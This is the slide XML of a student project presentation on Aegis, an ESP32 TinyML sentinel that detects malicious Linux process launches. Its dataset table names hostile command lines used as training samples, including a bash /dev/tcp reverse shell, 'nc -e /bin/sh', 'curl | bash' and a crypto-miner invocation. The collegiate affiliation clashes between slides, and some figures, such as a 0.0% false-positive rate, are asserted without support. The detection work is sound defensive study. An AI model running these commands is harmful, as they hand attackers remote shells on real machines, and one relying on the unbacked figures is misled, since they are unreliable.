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egis_graphical_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PROJECT PRESENTATION | SRM VALLIAMMAI ENGINEERING COLLEGE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AEGIS: EMBEDDED TINYML HARDWARE SENTINEL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr sz="1500" i="1">
                <a:solidFill>
                  <a:srgbClr val="48CAE4"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>With Continual Edge Learning for Real-Time Linux Kernel Exploit Prevention</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1400"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="1C2541"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>--------------------------------------------------------</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="A0AFC8"/>
                </a:solidFill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• SAI PRASATH P  (Reg No: 210425106193)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>• TAMIL SELVAN J  (Reg No: 210425106242)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:defRPr sz="1100">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Department of Electronics and Communication Engineering</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Chennai Institute of Technology (Autonomous), Chennai</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:defRPr sz="1050">
                <a:solidFill>
                  <a:srgbClr val="F39C12"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Faculty Mentors: Mr. Baskar M.E. (Supervisor) | Dr. T. S. Arulananth (HOD, ECE)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Executive Summary &amp; The Modern Threat Landscape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  <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>EVASIVE ZERO-DAY ATTACKS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr sz="1150">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Modern cyber-attacks exploit in-memory execution (`memfd_create`), library hooking (`LD_PRELOAD`), and high-entropy obfuscation that bypass static disk antiviruses effortlessly.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745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9C12"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>CLOUD SIEM BOTTLENECK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr sz="1150">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Offloading telemetry to cloud servers incurs 100ms - 5s network latency, leaks sensitive data, and leaves endpoints vulnerable during network disconnects.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FF"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>HOST-RESIDENT VULNERABILITY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr sz="1150">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Host-based security daemons (EDRs/HIDS) share CPU and memory with applications. Root privilege escalation allows attackers to blind or kill security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8CAE4"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>STATIC TINYML DEFICIT</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr sz="1150">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Edge ML models flashed onto microcontrollers are strictly frozen. When attackers mutate shellcode (concept drift), static edge models fail catastrophically.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Hardware Isolation Principle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9FF"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• PHYSICALLY DECOUPLED SILICON</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="3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The Aegis sentinel operates on an independent physical ESP32 MCU completely separate from the host CPU, RAM, and OS kernel.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:defRPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• IMMUNITY TO KERNEL ROOTKITS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="3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Even if an attacker gains ring-0 kernel control on Linux, there is NO electrical or architectural path to corrupt the ESP32's SRAM or flash memory.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:defRPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• ASYNCHRONOUS UART STREAM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="3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Telemetry streams unidirectionally across an isolated serial bridge @ 115200 baud, preventing malicious back-propagation into the sentinel.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1200"/>
              </a:spcBef>
              <a:defRPr sz="1300" b="1">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• DEDICATED PHYSICAL ALARMS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="3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Hardware OLED, piezo buzzer, and strobe LED cannot be muted or suppressed by host-side software malware daemons.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Aegis: Embedded TinyML Sentinel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CC71"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>SUB-45 µs LATENCY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1.25 µs Decision Tree triage + 42.1 µs Continual Perceptron inference enables pre-execution exploit containment.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9FF"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>ZERO DYNAMIC HEAP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100% static allocation (0 bytes malloc/free). 53.6 KB SRAM footprint guarantees zero heap fragmentation in 24/7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9C12"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>ON-CHIP CONTINUAL SGD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Resolves concept drift in 38.4 µs using Momentum SGD over a bounded 16-slot Replay Buffer without cloud retraining.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8CAE4"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>NON-VOLATILE MEMORY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Learned model weights permanently committed into ESP32 SPI Flash NVS partition, surviving power cuts and reboots.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Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>MULTI-MODAL SENSORY ALERTS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I2C 128x64 OLED for live entropy/threat scores, variable-pitch piezo buzzer, and intrusion strobe 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B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BF0F5"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>COMMODITY ECONOMICS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Entire hardware sentinel realized using off-the-shelf components with a total BOM cost under $10 USD.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Layered Architecture &amp; Firmware Co-Design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C9FF"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>TIER 1: HOST TELEMETRY INTERCEPTOR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="4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Runs inside Linux/WSL2 kernel. Extracts process creation events, /proc/[pid] metadata, CLI arguments, UID, and network sockets into ASCII serial frames.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48640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39C12"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>TIER 2: ISOLATED ESP32 SENTINEL CORE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="4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Xtensa 32-bit dual-core @ 240 MHz. Ingests frames into static ring buffer, computes Shannon entropy H(X), evaluates dual ML engine, runs momentum SGD.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48640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ECC71"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>TIER 3: MULTI-MODAL ACTUATION LAYER</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="4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Physical alert interface: SSD1306 OLED (128x64 I2C), active electromagnetic piezo acoustic buzzer (GPIO 4), and high-intensity alert strobe LED (GPIO 2).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Picture 8" descr="fig2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8-Dimensional Behavioral Feature Vector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1645920"/>
            <a:ext cx="4846320" cy="1828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182880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9C12"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>SHANNON INFORMATION ENTROPY H(X)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H(X) = - ∑ P(c_i) · log2 P(c_i) = - ∑ (n_i / N) · log2 (n_i / N)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</a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>Measures command-line character randomness. High entropy (&gt; 3.8) detects base64 shellcode, encrypted droppers, and packed binaries.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="fig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657600"/>
            <a:ext cx="4846320" cy="25603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577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103120"/>
                <a:gridCol w="2743200"/>
              </a:tblGrid>
              <a:tr h="508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Dim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Feature Name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Security Significance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x0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is_temp_path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Executes from /tmp or /dev/shm (droppers)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x1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arg_length_log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Log2 normalized argument length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x2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shannon_entropy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Obfuscation / packing randomness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x3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is_root_uid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Privileged execution (UID == 0)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network_socket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Active TCP/UDP socket (reverse shells)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x5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parent_anomaly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Heuristic parent-child process mismatch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x6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fileless_memfd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Anonymous in-memory execution flag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x7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entropy_rate_delta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Differential entropy between bin and args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Dual-Engine Machine Learning Ensemble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ENGINE 1: FAST DECISION TREE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• LATENCY: 1.25 µs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Evaluates within a single microsecond to provide immediate frontline triage.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• TRANSPYLED C CODE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Decision nodes compile directly into native Xtensa assembly conditional branches (if-else).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• NON-LINEAR CUTS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Instantly flags obvious exploit patterns (e.g. temp path + active socket + high entropy).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• DETERMINISTIC TIMING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Zero floating-point matrix multiplication or iterative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9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>ENGINE 2: CONTINUAL PERCEPTRON</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F39C12"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• LATENCY: 42.1 µs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Evaluates weighted activation dot product and non-linear sigmoid.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F39C12"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• ADAPTIVE WEIGHT VECTOR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Governed by dynamic weights w in R^8 and bias b updated on-chip.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F39C12"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• SIGMOID ACTIVATION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Computes precise malicious probability: P(Malicious | x) = 1 / (1 + e^-z).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1200">
                <a:solidFill>
                  <a:srgbClr val="F39C12"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• ZERO-DAY MUTATION RESOLUTION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Updates its decision hyperplane directly on the microcontroller via Momentum SGD.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On-Device Continual Learning &amp; Momentum SGD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MOMENTUM STOCHASTIC GRADIENT DESCENT (SGD)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• THE CONCEPT DRIFT CHALLENGE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Attackers mutate payload strings to shift feature distribution. Static models cannot adapt, leading to blind spots.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• VELOCITY VECTOR ACCELERATION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v^(t+1) = β · v^(t) + η · (y_hat - y) · x</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Exponentially decaying velocity dampens oscillations in sparse feature dimensions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• HYPERPLANE WEIGHT UPDATE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w^(t+1) = w^(t) - v^(t+1)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>b^(t+1) = b^(t) - η · (y_hat - y)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Executes in 38.4 µs using hardware floating-point acceleration on Xtensa LX6.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• CONFIGURED HYPERPARAMETERS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Learning Rate η = 0.05 | Momentum β = 0.90</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>Guarantees rapid convergence without overshooting stable boundaries.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="fig4_adaptat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Bounded Experience Replay &amp; Flash NVS Persistence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74C3C"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>CATASTROPHIC FORGETTING MITIGATION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="2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When training on novel zero-day attacks, traditional models abruptly erase previously learned patterns. Aegis mitigates this with Experience Replay (ER).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486400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BOUNDED 16-SLOT FIFO RING BUFFER</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="2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Holds exactly 16 historical anchor vectors in static memory (1,536 bytes). Retains past benign and exploit anchors with constant O(1) memory complexity.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486400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9C12"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>FLASH NVS WEAR-LEVELING</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="2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Commits adapted weights to ESP32 SPI Flash Non-Volatile Storage (NVS). Survives electrical power cuts with &gt; 100,000 write cycle endurance.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486400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CC71"/>
                </a:solidFill>
                <a:latin typeface="Segoe UI"/>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>COLD-BOOT WEIGHT RESTORATION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="2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During bootup, the firmware scans NVS: if custom weights exist, they are restored into SRAM within 1.8 ms; otherwise, factory weights load.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="Picture 10" descr="Fig5_Confusion_Matrix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Hardware Assembly &amp; Peripheral Interfacing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645920"/>
                <a:gridCol w="1828800"/>
              </a:tblGrid>
              <a:tr h="762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Peripheral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Pin Mapping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Electrical Standard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Functional Role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ESP32 DEVKIT V1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Core MCU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3.3V CMOS @ 240MHz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Dual-core compute &amp; ML inference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SSD1306 OLED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GPIO 21 / 22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I2C Fast Mode (400kHz)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128x64 live telemetry &amp; threat UI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Piezo Buzzer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GPIO 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PWM (2.4 - 3.5 kHz)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Audible severity tone alerts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Alert Strobe LED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GPIO 2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3.3V Digital Out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Visual pulse / strobe alarm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USB-UART Bridge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GPIO 1 / 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115200 Baud Serial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Isolated kernel telemetry channel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98079" y="1645920"/>
            <a:ext cx="393192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ELECTRICAL SPECIFICATIONS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1100">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• OPERATING VOLTAGE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5.0V USB input / 3.3V regulated rail via AMS1117.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1100">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• CURRENT CONSUMPTION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95 mA average draw (0.475 W). Well under 150 mA budget.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1100">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• SIGNAL INTEGRITY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4.7 kΩ hardware pull-ups on I2C lines to suppress bus noise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1100">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• INDUCTIVE PROTECTION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NPN 2N2222 transistor driver with flyback diode for piezo buzzer.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1100">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• TOTAL BOM COST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&lt; $10 USD using accessible commodity components.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Punctuation Entropy &amp; Safe Syntax Exemption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74C3C"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>THE FALSE POSITIVE CHALLENGE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="F39C12"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• INLINE SCRIPT WORKLOADS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Benign developer commands (e.g. `python3 -c "print('Hello'); time.sleep(1)"`) contain quotes, colons, brackets, and diverse character sets.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="F39C12"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• HIGH RAW ENTROPY (&gt; 3.3)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Raw Shannon entropy routinely exceeds 3.3 bits/char, causing naive models to mistake benign code for obfuscated shellcode.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="F39C12"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• INITIAL FALSE ALARM RATE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Baseline models without syntactic awareness exhibited a 28.4% false positive rate on developer workstations.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THE AEGIS EXEMPTION FILTER</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• SYNTACTIC PUNCTUATION RATIO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Evaluates ratio of structured characters (', ", ;, :, (, ), [, ], spaces) relative to argument length.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• EXEMPTION CRITERIA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If Punctuation Ratio &gt; 18%, not in temp path (x0 == 0), and no active raw network sockets (x4 == 0) -&gt; Classified as SAFE.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="1000"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1150">
                <a:solidFill>
                  <a:srgbClr val="00C9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>• EMPIRICAL OUTCOME</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:defRPr sz="1050">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>False positives on developer workloads dropped from 28.4% to exactly 0.0% while retaining 100% sensitivity to actual malware droppers.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Dataset Composition &amp; Evaluation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4389120"/>
                <a:gridCol w="210312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Threat Category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Sample Count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Representative Workload / Exploit Tools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Target Ground Truth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Class 0: Benign Admin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3,500 Samples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ls, grep, top, cat, ps aux, sudo apt update, systemctl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Label 0 (Safe)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Class 1: High-Entropy Dev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2,500 Samples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python3 -c '...', base64 -d cert.pem, docker run, git commit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Label 0 (Safe)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Class 2: Crypto-Miners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2,000 Samples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xmrig --url stratum+tcp://..., minerd -a cryptonight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Label 1 (Malicious)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Class 3: Reverse TCP Shells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2,000 Samples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bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1, nc -e /bin/sh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Label 1 (Malicious)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Class 4: Fileless Droppers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2,000 Samples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memfd_create dropper, curl | bash, LD_PRELOAD injection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Label 1 (Malicious)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Classification Efficacy &amp; Confusion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ACCURACY</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>92.46% (Baseline)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>98.15% (Post-Learning)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116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99231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9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>PRECISION</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>92.45% (Baseline)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>97.80% (Post-Learning)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75504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9C12"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>RECALL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>92.45% (Baseline)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>98.50% (Post-Learning)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645920"/>
            <a:ext cx="20116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6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F1-SCORE</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>0.9254 (Baseline)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>0.9815 (Post-Learning)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645920"/>
            <a:ext cx="201168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173736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ROC-AUC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="400"/>
              </a:spcBef>
              <a:defRPr sz="1100" b="1">
                <a:solidFill>
                  <a:srgbClr val="EBF0F5"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>0.9620 (Baseline)</a:t>
            </a:r>
            <a:br/>
            <a:r>
              <a:t>0.9940 (Post-Learning)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="Picture 12" descr="Fig5_Confusion_Matrix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5120640" cy="3200400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Picture 13" descr="fig4_adaptation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200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Microsecond Latency &amp; Zero Dynamic Heap Benchmarks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Firmware Operation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Maximum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Headroom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UART Byte Parsing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8.5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12.1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Shannon Entropy H(X)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18.4 µs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24.6 µs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8D Vector Assembly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4.3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6.2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Decision Tree Triage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1.25 µs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1.8 µs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Continual Perceptron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36.2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42.1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Total End-to-End Latency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41.5 µs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44.8 µs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Guaranteed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On-Chip Momentum SGD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38.4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43.5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9FF"/>
                </a:solidFill>
              </a:defRPr>
            </a:pPr>
            <a:r>
              <a:t>MEMORY SAFETY: 0 BYTES DYNAMIC HEAP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:defRPr b="1" sz="1100">
                <a:solidFill>
                  <a:srgbClr val="F39C12"/>
                </a:solidFill>
              </a:defRPr>
